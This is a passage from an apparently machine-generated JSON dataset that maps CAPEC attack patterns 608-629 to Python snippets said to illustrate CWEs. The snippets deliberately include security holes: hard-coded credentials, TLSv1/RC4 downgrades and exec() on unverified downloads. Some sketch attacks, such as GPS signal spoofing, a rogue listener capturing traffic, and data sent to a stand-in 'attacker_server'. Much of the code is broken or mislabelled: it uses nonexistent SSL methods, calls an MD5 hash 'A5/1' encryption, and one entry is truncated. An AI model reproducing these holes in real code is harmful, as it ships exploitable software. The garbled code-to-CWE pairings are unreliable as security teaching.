os.urandom(1) == b'\\x01':\n        print(\"Race condition detected, undermining security guarantees\")\n        time.sleep(1)\n        component1_status = not component1_status\n        component2_status = not component2_status\n\n    # Simulating an attacker obstructing the interactions between system components\n    if os.urandom(1) == b'\\x02':\n        print(\"Attacker is obstructing the interactions between system components\")\n        time.sleep(1)\n        component1_status = False\n        component2_status = False\n",
        "description": "This code snippet demonstrates the CAPEC of obstructing interactions between system components, leading to a degraded or unavailable system. It incorporates CWEs 693, 1334, 653, 1332, and 1298 to showcase the various ways an attacker can exploit the system."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "import hashlib\n\ndef encrypt_data(plaintext, key):\n    # CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n    # Using a weak encryption algorithm like A5/1\n    cipher = hashlib.md5(key.encode() + plaintext.encode()).digest()\n    return cipher\n\ndef main():\n    # CWE-321: Use of Hard-coded Cryptographic Key\n    key = 'hardcoded_key'\n    plaintext = 'secret_message'\n    encrypted_data = encrypt_data(plaintext, key)\n    # CWE-326: Inadequate Encryption Strength\n    # Using a short key\n    print('Encrypted data:', encrypted_data.hex())\n    # CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n    # Downgrading to a weaker encryption algorithm\n    weaker_key = 'weaker_key'\n    weaker_encrypted_data = encrypt_data(plaintext, weaker_key)\n    print('Downgraded encrypted data:', weaker_encrypted_data.hex())\n\ndef setup_cellular_connection():\n    # CWE-1300: Improper Protection of Physical Side Channels\n    # Not protecting against physical side channels\n    pass\n\nif __name__ == '__main__':\n    main()\n    setup_cellular_connection()",
        "description": "This code snippet demonstrates the CAPEC of using cryptanalytic techniques to derive cryptographic keys or otherwise effectively defeat cellular encryption. It uses a weak encryption algorithm (A5/1), hard-coded cryptographic key, inadequate encryption strength, and downgrades to a weaker encryption algorithm during negotiation. Additionally, it lacks protection against physical side channels."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "import socket\n\ndef send_unencrypted_data(cell_number, message):\n    # CWE-311: Missing Encryption of Sensitive Data\n    # CWE-319: Cleartext Transmission of Sensitive Information\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_address = ('localhost', 12345)\n    sock.connect(server_address)\n    sock.sendall(cell_number.encode() + b':' + message.encode())\n    sock.close()\n\n\ndef receive_unverified_data():\n    # CWE-940: Improper Verification of Source of a Communication Channel\n    # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_address = ('localhost', 12345)\n    sock.bind(server_address)\n    sock.listen(1)\n    connection, client_address = sock.accept()\n    data = connection.recv(1024)\n    cell_number, message = data.decode().split(':')\n    print(f'Received message from {cell_number}: {message}')\n    connection.close()\n\n# CWE-927: Use of Implicit Intent for Sensitive Communication (Android-specific, not applicable in this Python example)\n",
        "description": "This Python code snippet demonstrates the CAPEC of intercepting cellular traffic by simulating a vulnerable communication channel. The 'send_unencrypted_data' function sends sensitive data (cell number and message) in cleartext over a socket, violating CWE-311 and CWE-319. The 'receive_unverified_data' function receives data without verifying the source of the communication channel, violating CWE-940, and without ensuring message integrity during transmission, violating CWE-924."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "import socket\nimport json\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-201: Insertion of Sensitive Information Into Sent Data\n\n# Establish a communication channel with an endpoint\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('endpoint_ip', 8080))\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# Activate test or debug logic to alter the intended behavior of the system\ndebug_mode = True\nif debug_mode:\n    sensitive_data = {'username': 'admin', 'password': 'password'}\nelse:\n    sensitive_data = {}\n\n# CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n# Transmit data to another actor without controlling the network traffic volume\nfor i in range(1000):\n    data = {'message': 'Hello, world!', 'sensitive_info': sensitive_data}\n    sock.send(json.dumps(data).encode())\n",
        "description": "This Python code snippet demonstrates the CAPEC of injecting data into mobile technology traffic to disrupt communications or conduct additional surveillance operations. It establishes a communication channel with an endpoint and transmits sensitive information in cleartext, without ensuring message integrity during transmission. The code also activates test or debug logic to alter the intended behavior of the system, and transmits a large volume of data without controlling the network traffic volume."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "import urllib.parse\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\ndef redirect_to_untrusted_site(url):\n    return urllib.parse.urlparse(url).geturl()\n\n# CWE-84: Improper Neutralization of Encoded URI Schemes in a Web Page\ndef encode_uri_scheme(url):\n    return urllib.parse.quote(url, safe=':/')\n\n# CWE-494: Download of Code Without Integrity Check\ndef download_code_without_integrity_check(url):\n    import requests\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n\n# CWE-294: Authentication Bypass by Capture-replay\ndef capture_replay_authentication_bypass(url, username, password):\n    import requests\n    response = requests.get(url, auth=(username, password), stream=True)\n    if response.status_code == 200:\n        return response.text\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\ndef use_get_request_method_with_sensitive_query_strings(url, sensitive_data):\n    import requests\n    response = requests.get(url, params=sensitive_data)\n    if response.status_code == 200:\n        return response.text\n\n# BitSquatting attack\ntrusted_domain = 'example.com'\nbit_squatted_domain = 'examp1e.com'\n\n# Register the bit-squatted domain\n# ... (omitted for brevity)\n\n# Redirect traffic to the bit-squatted domain\nurl = f'http://{bit_squatted_domain}/redirect'\nredirect_to_untrusted_site(url)\n",
        "description": "This Python code snippet demonstrates a BitSquatting attack, which leverages random errors in memory to direct Internet traffic to an adversary-controlled destination. The code includes examples of related CWEs, including URL redirection to an untrusted site, improper neutralization of encoded URI schemes, download of code without integrity check, authentication bypass by capture-replay, and use of GET request method with sensitive query strings."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "import socket\nimport uuid\n\n# CWE-201: Insertion of Sensitive Information Into Sent Data\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-421: Race Condition During Access to Alternate Channel\n\ndef track_user(mac_address):\n    # Create a socket to listen for WiFi messages\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)\n    sock.bind((\"0.0.0.0\", 0))\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n    # CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n    # CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n    # Assume we have a function to get the access control list (ACL) for the user\n    acl = get_acl(mac_address)\n\n    # Listen for WiFi messages and log the associated MAC addresses\n    while True:\n        data, addr = sock.recvfrom(1024)\n        if addr[0] == mac_address:\n            # Log the MAC address and associated user information\n            log_mac_address(mac_address, acl)\n\n# Example usage\nmac_address = \"00:11:22:33:44:55\"\ntrack_user(mac_address)\n",
        "description": "This Python code snippet demonstrates the CAPEC attack scenario where an attacker passively listens for WiFi messages and logs the associated Media Access Control (MAC) addresses to track users. The code includes vulnerabilities related to CWE-201, CWE-300, CWE-421, CWE-1316, and CWE-529, making it susceptible to unauthorized access and data exposure."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "import socket\nimport json\n\n# CWE-201: Insertion of Sensitive Information Into Sent Data\nssid_data = {'ssid': 'public_wifi', 'user_id': 'user123'}\n\n# CWE-300: Channel Accessible by Non-Endpoint\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.bind(('0.0.0.0', 8080))\n\nwhile True:\n    data, addr = sock.recvfrom(1024)\n    if data:\n        # CWE-1290: Incorrect Decoding of Security Identifiers\n        ssid_info = json.loads(data.decode('utf-8'))\n        if ssid_info['ssid'] == ssid_data['ssid']:\n            # CWE-1192: Improper Identifier for IP Block used in System-On-Chip (SOC)\n            # CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n            print(f'User {ssid_info[",
        "description": "This Python code snippet demonstrates a vulnerable WiFi network tracking system. It listens for incoming WiFi management frame messages containing the Service Set Identifier (SSID) and user ID. The code transmits sensitive information (user ID) over an unsecured channel, allowing an attacker to track users. The code also lacks proper verification of the communication channel and security identifiers, making it vulnerable to unauthorized access."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "import pyDes\nimport hashlib\n\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n# CWE-326: Inadequate Encryption Strength\nkey = 'insecure_des_key'\ndes = pyDes.des(key, pyDes.CBC, IV=bytearray(b'\\x00' * 8))\n\n# CWE-1277: Firmware Not Updateable\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\nfirmware_data = b'firmware_update_data'\nencrypted_firmware = des.encrypt(firmware_data)\n\n# CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\n# Simulating OTA update via SMS\nsms_message = ' OTA update: ' + encrypted_firmware.decode('latin-1')\n\n# Sending SMS to device\n# This would be replaced with actual SMS sending functionality\nprint('Sending SMS:', sms_message)\n",
        "description": "Python code snippet demonstrating the CAPEC attack on SIM cards using OTA updates via SMS. The code uses an insecure DES key for encryption, which can be cracked by an attacker. The firmware update data is encrypted using this key and sent to the device as a signed binary SMS message, which can be executed on the SIM as a Java applet. This applet can access sensitive information and perform malicious actions."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "import socket\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-940: Improper Verification of Source of a Communication Channel\n\n# Create a rogue Wi-Fi access point\nap_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nap_socket.bind(('192.168.1.1', 80))\nap_socket.listen(5)\n\nwhile True:\n    conn, addr = ap_socket.accept()\n    print('Connected by', addr)\n\n    # CWE-319: Cleartext Transmission of Sensitive Information\n    # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    data = conn.recv(1024)\n    print('Received:', data.decode('utf-8'))\n    conn.sendall(data)\n    conn.close()",
        "description": "This Python code snippet demonstrates a rogue Wi-Fi access point that intercepts and captures Wi-Fi data traffic, allowing an adversary to use 'adversary-in-the-middle' tactics for all communications. The code creates a socket, binds it to a specific IP address and port, and listens for incoming connections. When a connection is established, it receives and prints the data sent by the client, and then sends the data back to the client without any encryption or verification, making it vulnerable to eavesdropping and tampering."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "import os\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nsensitive_data = {'username': 'admin', 'password': 'password'}\n\n# CWE-940: Improper Verification of Source of a Communication Channel\nmalicious_resource_location = 'http://rogue-location.com/malicious_resource'\n\n# CWE-1229: Creation of Emergent Resource\nos.symlink(malicious_resource_location, 'legitimate_resource_location')\n\n# CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\ndef access_resource(resource_location):\n    return open(resource_location, 'r').read()\n\n# CWE-426: Untrusted Search Path\nsearch_path = ['.', 'path/to/legitimate/resource', malicious_resource_location]\nfor path in search_path:\n    if os.path.exists(os.path.join(path, 'resource')):\n        print(access_resource(os.path.join(path, 'resource')))\n        break",
        "description": "This Python code snippet demonstrates the CAPEC of providing a malicious version of a resource at a location similar to the expected location of a legitimate resource. It exposes sensitive information, improperly verifies the source of a communication channel, creates an emergent resource, transmits private resources into a new sphere, and uses an untrusted search path. The code creates a symbolic link to a malicious resource location, making it accessible as if it were a legitimate resource. The search path is then manipulated to prioritize the malicious resource location, allowing an attacker to intercept sensitive information."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "import socket\n\ndef establish_connection(cellular_device_ip, cellular_device_port, rogue_base_station_ip, rogue_base_station_port):\n    # CWE-940: Improper Verification of Source of a Communication Channel\n    # No verification of the source of the communication channel\n    cellular_device_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    cellular_device_socket.connect((cellular_device_ip, cellular_device_port))\n    \n    # CWE-300: Channel Accessible by Non-Endpoint\n    # No verification of the identity of the actor at the other end of the channel\n    rogue_base_station_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    rogue_base_station_socket.bind((rogue_base_station_ip, rogue_base_station_port))\n    rogue_base_station_socket.listen(1)\n    \n    # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    # No integrity check on the message received from the cellular device\n    message_from_cellular_device = cellular_device_socket.recv(1024)\n    \n    # CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n    # No restriction on the communication channel to the intended endpoint\n    rogue_base_station_socket.send(message_from_cellular_device)\n    \n    # CWE-421: Race Condition During Access to Alternate Channel\n    # No synchronization mechanism to prevent race conditions during access to the alternate channel\n    alternate_channel_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    alternate_channel_socket.connect((rogue_base_station_ip, rogue_base_station_port))\n",
        "description": "Python code snippet demonstrating the CAPEC attack scenario where an attacker imitates a cellular base station with their own rogue base station equipment, exploiting CWE-940, CWE-300, CWE-924, CWE-923, and CWE-421 vulnerabilities."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "import requests\n\ndef send_broadcast_message(phone_number, location_area_code):\n    # CWE-201: Insertion of Sensitive Information Into Sent Data\n    # Sending phone number and location area code in plain text\n    data = {'phone_number': phone_number, 'location_area_code': location_area_code}\n    response = requests.post('https://cellular-network.com/broadcast', json=data)\n    if response.status_code == 200:\n        # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        # Not verifying the integrity of the response message\n        return response.text\n    else:\n        return None\n\ndef verify_location(phone_number, location_area_code):\n    # CWE-940: Improper Verification of Source of a Communication Channel\n    # Not verifying the source of the broadcast message\n    response = send_broadcast_message(phone_number, location_area_code)\n    if response:\n        # CWE-927: Use of Implicit Intent for Sensitive Communication\n        # Using an implicit intent to transmit sensitive data\n        intent = {'action': 'com.example.VERIFY_LOCATION', 'data': response}\n        send_intent(intent)\n        return True\n    else:\n        return False\n\ndef send_intent(intent):\n    # CWE-300: Channel Accessible by Non-Endpoint\n    # Not verifying the identity of the actor receiving the intent\n    requests.post('https://android-application.com/intent', json=intent)\n",
        "description": "Python code snippet demonstrating the CAPEC attack scenario, where an attacker uses a target's mobile phone number to trigger a cellular broadcast message and verify their location. The code includes CWEs 201, 924, 940, 927, and 300, showcasing vulnerabilities in sensitive data transmission, message integrity, source verification, implicit intent usage, and channel access control."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "import socket\nimport signal\nimport time\nimport math\n\n# CWE-201: Insertion of Sensitive Information Into Sent Data\n# CWE-1300: Improper Protection of Physical Side Channels\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-432: Dangerous Signal Handler not Disabled During Sensitive Operations\n\ndef signal_handler(sig, frame):\n    # Handle signal, but do not mask or prevent other signal handlers from being invoked\n    print(\"Signal received\")\n\nsignal.signal(signal.SIGUSR1, signal_handler)\n\n# Establish a communication channel with an endpoint\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.bind((\"localhost\", 8080))\nsock.listen(1)\nconn, addr = sock.accept()\n\n# Receive a message from the endpoint, but do not sufficiently ensure that the message was not modified during transmission\ndata = conn.recv(1024)\n\n# Calculate the signal strength based on the received data\nsignal_strength = math.sqrt(sum(bytearray(data)) / len(data))\n\n# Use the signal strength to identify the source location of the signal\n# (This is a simplified example and does not actually implement the CAPEC)\nlocation = \"Unknown\"\nif signal_strength > 50:\n    location = \"Nearby\"\nprint(\"Location: \" + location)\n\n# Send a response back to the endpoint, including sensitive information\nconn.sendall(b\"Response from server: \" + data)\n\n# Do not properly verify that the request is coming from the expected origin\nconn.close()\n",
        "description": "This Python code snippet demonstrates the CAPEC attack scenario where an attacker passively monitors the signal strength of the target's cellular RF signal or WiFi RF signal to identify the source location of the signal. The code includes vulnerabilities related to CWE-201, CWE-1300, CWE-940, CWE-924, and CWE-432, which can be exploited by an attacker to compromise the system."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "import socket\nimport ssl\n\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)\ncontext.options |= ssl.OP_NO_TLSv1_1\ncontext.options |= ssl.OP_NO_TLSv1_2\n\nconn = socket.create_connection(('example.com', 443))\nsslsoc = context.wrap_socket(conn, server_hostname='example.com')\n\n# Using a weak encryption algorithm\nsslsoc.set_cipher('RC4-MD5')\n\n# Hard-coded cryptographic key\nkey = 'my_secret_key'\n\n# Storing sensitive information in cleartext\npassword = 'my_password'\n\n# Inadequate encryption strength\nencrypted_data = sslsoc.encrypt(password.encode('utf-8'), key.encode('utf-8'))\n\nprint(encrypted_data)\n",
        "description": "This Python code snippet demonstrates the CAPEC of forcing the encryption level to be lowered. It uses the TLSv1 protocol, which is an older and less secure version of the TLS protocol. It then sets the cipher to 'RC4-MD5', which is a weak encryption algorithm. The code also uses a hard-coded cryptographic key, stores sensitive information (a password) in cleartext, and uses inadequate encryption strength. This code is vulnerable to various attacks, including algorithm downgrade attacks."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "import socket\nimport time\nimport struct\n\n# Establish a connection to the server\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.connect(('localhost', 8080))\n\n# Send sensitive information in cleartext\nusername = b'admin'\npassword = b'password123'\npacket = struct.pack('>I', len(username)) + username + struct.pack('>I', len(password)) + password\nserver_socket.sendall(packet)\n\n# Create a covert timing channel by introducing a delay based on the username\nif username == b'admin':\n    time.sleep(0.5)\n\n# Send a packet with a size that reveals information about the operation\npacket_size = 1024\nif username == b'admin':\n    packet_size = 2048\npacket = bytearray(packet_size)\nserver_socket.sendall(packet)\n\n# Close the connection\nserver_socket.close()",
        "description": "This code snippet demonstrates the CAPEC of intercepting and logging encrypted transmissions to analyze metadata. It includes CWE-201 by sending sensitive information (username and password) in cleartext, CWE-319 by transmitting sensitive information without encryption, CWE-385 by creating a covert timing channel based on the username, and CWE-208 by introducing an observable timing discrepancy based on the packet size."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "import hashlib\n\ndef encrypt_data(plain_text, key):\n    cipher = hashlib.sha1()  # CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n    cipher.update(key.encode('utf-8'))\n    encrypted_data = cipher.digest()\n    return encrypted_data\n\n\ndef transmit_data(encrypted_data):\n    # CWE-201: Insertion of Sensitive Information Into Sent Data\n    # CWE-300: Channel Accessible by Non-Endpoint\n    # No verification of the identity of actors at both ends of the communication channel\n    # No encryption of the communication channel\n    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    socket.connect(('localhost', 8080))\n    socket.sendall(encrypted_data)\n    socket.close()\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n# No protection mechanisms to prevent physical side channels from exposing sensitive information\n# No protection against electromagnetic fault injection attacks\nplain_text = 'secret_data'\nkey = 'weak_key'\nencrypted_data = encrypt_data(plain_text, key)\ntransmit_data(encrypted_data)",
        "description": "This code snippet demonstrates the CAPEC of passively monitoring electromagnetic emanations to derive sensitive information. It uses a broken cryptographic algorithm, transmits sensitive information over an unsecured channel, and lacks protection mechanisms against physical side channels and electromagnetic fault injection attacks."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "import socket\nimport time\nimport random\n\n# CWE-201: Insertion of Sensitive Information Into Sent Data\nsensitive_data = 'Top Secret Information'\n\n# CWE-1300: Improper Protection of Physical Side Channels\nemission_signal = ''\nfor char in sensitive_data:\n    emission_signal += str(random.randint(0, 1))\n\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\ntry:\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('attacker_server', 8080))\n    sock.sendall(emission_signal.encode())\nexcept Exception as e:\n    # CWE-1420: Exposure of Sensitive Information during Transient Execution\n    print(f'Error: {e}')\n    # CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n    time.sleep(0.1)\n    sock.sendall(emission_signal.encode())",
        "description": "This Python code snippet demonstrates the CAPEC of Compromising Emanations. It intentionally transmits sensitive information over a network socket, which can be intercepted and analyzed by an attacker. The code also includes CWE-1300 by generating a signal that can be intercepted through physical side channels. CWE-1320 is demonstrated by not properly handling error messages and alert signals. CWE-1420 is shown by potentially exposing sensitive information during transient execution. CWE-1319 is demonstrated by not protecting against electromagnetic fault injection attacks."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "import os\nimport time\nimport random\n\ndef inject_fault():\n    # Simulate voltage glitch\n    os.system('echo 1 > /sys/bus/i2c/devices/i2c-1/1-0045/voltage_glitch')\n    time.sleep(random.uniform(0.01, 0.1))\n    os.system('echo 0 > /sys/bus/i2c/devices/i2c-1/1-0045/voltage_glitch')\n\n# Cryptographic operation\ndef encrypt_data(plain_text, key):\n    # Assume a simple XOR encryption for demonstration purposes\n    cipher_text = bytearray()\n    for char in plain_text:\n        cipher_text.append(char ^ key)\n    return bytes(cipher_text)\n\n# Main program\nkey = 0x12\nplain_text = b'Hello, World!'\n\nwhile True:\n    try:\n        cipher_text = encrypt_data(plain_text, key)\n        print('Encrypted:', cipher_text)\n        # Simulate clock glitch\n        os.system('echo 1 > /sys/bus/i2c/devices/i2c-1/1-0045/clock_glitch')\n        time.sleep(random.uniform(0.01, 0.1))\n        os.system('echo 0 > /sys/bus/i2c/devices/i2c-1/1-0045/clock_glitch')\n    except Exception as e:\n        print('Error:', str(e))\n        # Handle error, potentially leaking sensitive information\n        print('Key:', key)\n",
        "description": "This Python code snippet demonstrates a vulnerable cryptographic operation susceptible to voltage and clock glitches, as well as electromagnetic fault injection attacks. The code simulates a simple XOR encryption, but the cryptographic operation is interrupted by voltage and clock glitches, which can potentially leak sensitive information, such as the encryption key. The code also lacks proper protection against hardware overheating, semiconductor defects, and improper restriction of software interfaces to hardware features, making it vulnerable to various attacks."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "import hashlib\n\ndef vulnerable_crypto_operation(key):\n    # CWE-1247: No protection against voltage and clock glitches\n    # CWE-1248: Semiconductor defects in hardware logic\n    # CWE-1319: No protection against electromagnetic fault injection\n    try:\n        # Perform cryptographic operation\n        encrypted_data = hashlib.sha256(key.encode()).hexdigest()\n    except Exception as e:\n        # CWE-1332: Improper handling of faults that lead to instruction skips\n        # CWE-1334: Unauthorized error injection can degrade hardware redundancy\n        # CWE-1338: Improper protections against hardware overheating\n        # CWE-1351: Improper handling of hardware behavior in exceptionally cold environments\n        print(\"Error:\", str(e))\n        # CWE-1256: Improper restriction of software interfaces to hardware features\n        # Attempt to recover from fault by resetting hardware\n        reset_device()\n    return encrypted_data\n\n# CWE-1247: No protection against voltage and clock glitches\n# CWE-1248: Semiconductor defects in hardware logic\n# CWE-1319: No protection against electromagnetic fault injection\ndef reset_device():\n    # Reset device hardware\n    pass\n",
        "description": "Python code snippet demonstrating a vulnerable cryptographic operation susceptible to fault injection attacks, exploiting CWEs 1247, 1248, 1256, 1319, 1332, 1334, 1338, and 1351."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "import cv2\nimport numpy as np\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# CWE-294: Authentication Bypass by Capture-replay\n\ndef analyze_oil_smudges(image_path):\n    img = cv2.imread(image_path)\n    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n    _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU)\n    contours, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\n    for contour in contours:\n        area = cv2.contourArea(contour)\n        x, y, w, h = cv2.boundingRect(contour)\n        aspect_ratio = float(w)/h\n        if area > 100 and aspect_ratio > 2:\n            cv2.drawContours(img, [contour], -1, (0, 255, 0), 2)\n            print(\"Oil smudge detected at ({}, {})\".format(x, y))\n\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-1278: Missing Protection Against Hardware Reverse Engineering Using Integrated Circuit (IC) Imaging Techniques\n# CWE-1125: Excessive Attack Surface\n\ndef authenticate(user_input):\n    # Simulate authentication protocol\n    if user_input == \"password123\":\n        return True\n    else:\n        return False\n\n# Main function\nif __name__ == \"__main__\":\n    image_path = \"touchscreen_image.jpg\"\n    analyze_oil_smudges(image_path)\n    user_input = input(\"Enter password: \")\n    if authenticate(user_input):\n        print(\"Authentication successful\")\n    else:\n        print(\"Authentication failed\")",
        "description": "This Python code snippet demonstrates a vulnerable touchscreen authentication system that is susceptible to oil smudge attacks. The code uses OpenCV to analyze an image of the touchscreen for oil smudges, which can reveal the password pattern. The authentication function is also vulnerable to reflection attacks, capture-replay attacks, and hardware reverse engineering. The code intentionally lacks protection mechanisms to prevent physical side channels, making it vulnerable to attacks that exploit these weaknesses."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-294: Authentication Bypass by Capture-replay\n\ndef spoof_gps_signal():\n    # Create a socket to broadcast the spoofed GPS signal\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    \n    # CWE-222: Truncation of Security-relevant Information\n    # Truncate the timestamp to make it appear as if the signal is coming from a trusted source\n    timestamp = int(time.time())\n    timestamp_truncated = timestamp & 0xFFFFFFFF\n    \n    # CWE-925: Improper Verification of Intent by Broadcast Receiver\n    # Create a spoofed GPS signal with the truncated timestamp\n    gps_signal = struct.pack('>I', timestamp_truncated) + b'\\x01\\x02\\x03\\x04'\n    \n    # Broadcast the spoofed GPS signal\n    sock.sendto(gps_signal, ('255.255.255.255', 12345))\n    \n# Call the function to spoof the GPS signal\nspoof_gps_signal()",
        "description": "This Python code snippet demonstrates a GPS spoofing attack, where a malicious actor broadcasts a counterfeit GPS signal to deceive a GPS receiver. The code exploits CWE-940 by not verifying the source of the communication channel, CWE-924 by not ensuring the integrity of the message during transmission, CWE-222 by truncating the timestamp, CWE-925 by not verifying the intent of the broadcast receiver, and CWE-294 by allowing authentication bypass through capture-replay."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "import socket\nimport time\nimport math\n\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-940: Improper Verification of Source of a Communication Channel\n\n# Establish a communication channel with the target receiver\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# Spoof the source IP address and port\nspoofed_ip = '192.168.1.100'\nspoofed_port = 1234\n\n# CWE-222: Truncation of Security-relevant Information\n# Truncate the security-relevant information (e.g., timestamp)\ntruncated_timestamp = int(time.time() * 1000) % 1000\n\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# Generate a fake GPS signal with a gradually increasing power\nfake_gps_signal = {'lat': 37.7749, 'lon': -122.4194, 'power': 10}\n\nwhile True:\n    # Send the fake GPS signal with the spoofed source IP and port\n    sock.sendto(str(fake_gps_signal).encode(), (spoofed_ip, spoofed_port))\n    \n    # Gradually increase the power of the fake GPS signal\n    fake_gps_signal['power'] += 1\n    \n    # Truncate the security-relevant information (e.g., timestamp)\n    fake_gps_signal['timestamp'] = truncated_timestamp\n    \n    # Wait for a short period before sending the next fake GPS signal\n    time.sleep(0.1)\n",
        "description": "This Python code snippet demonstrates a GPS spoofing attack, specifically a carry-off attack, where an adversary broadcasts fake GPS signals with gradually increasing power to manipulate the target receiver's location. The code exploits multiple weaknesses, including authentication bypass by spoofing, truncation of security-relevant information, incorrectly specified destination in a communication channel, improper verification of source of a communication channel, and improper enforcement of message integrity during transmission in a communication channel."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "import os\n\nclass PowerConsumingResource:\n    def __init__(self):\n        self.is_consumed = False\n\n    def consume_power(self):\n        if not self.is_consumed:\n            self.is_consumed = True\n            # Simulate power consumption\n            os.system('power_consuming_command')\n        else:\n            print('Power already consumed')\n\n    def release_power(self):\n        # Missing release of resource after effective lifetime\n        pass\n\n    def authenticate(self, username, password):\n        # Incorrect authorization\n        if username == 'admin' and password == 'password':\n            return True\n        else:\n            return False\n\n    def handle_device_name(self, device_name):\n        # Improper handling of Windows device names\n        if device_name == 'AUX' or device_name == 'CON':\n            print('Device name is not handled correctly')\n        else:\n            print('Device name is handled correctly')\n\nresource = PowerConsumingResource()\n\nwhile True:\n    if resource.authenticate('admin', 'password'):\n        resource.consume_power()\n        # Missing release of resource after effective lifetime\n        # Incorrect restriction of power consumption\n    else:\n        print('Authentication failed')",
